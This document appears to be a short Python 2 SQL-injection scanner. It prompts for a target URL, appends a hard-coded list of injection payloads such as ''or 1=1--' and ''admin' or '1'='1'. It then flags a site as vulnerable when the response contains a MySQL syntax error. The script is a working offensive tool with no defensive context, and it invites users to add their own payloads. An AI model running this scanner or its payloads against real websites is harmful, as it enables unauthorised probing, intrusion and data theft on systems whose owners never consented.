import sys
import urllib
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   HEADER = '\033[95m'
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan
def sql():
    fullurl = raw_input(''+T+'' + color.UNDERLINE + 'Full URL> ' + color.END)
    errormsg = "You have an error in your SQL syntax"
    payloads = ["'admin'or 1=1 or ''='", "'=1\' or \'1\' = \'1\'", "'or 1=1", "'1 'or' 1 '=' 1", "'or 1=1#", "'0 'or' 0 '=' 0", "'admin'or 1=1 or ''='", "'admin' or 1=1", "'admin' or '1'='1", "'or 1=1/*", "'or 1=1--"] #whatever payloads you want here ## YOU CAN ADD YOUR OWN
    errorr = "yes"
    for payload in payloads:
        try:
            payload = payload
            resp = urllib.urlopen(fullurl + payload)
            body = resp.read()
            fullbody = body.decode('utf-8')
        except:
            print R + "[-] Error! Manually check this payload: " + W + payload
            errorr = "no"
            #sys.exit()
        if errormsg in fullbody:
            if errorr == "no":
                print R + "[-] That payload might not work!"
                errorr = "yes"
            else:
                print G + "[+] The website IS SQL injection vulnerable! Payload: " + W + payload
        else:
            print R + "[-] The website is NOT SQL injection vulnerable!" + W
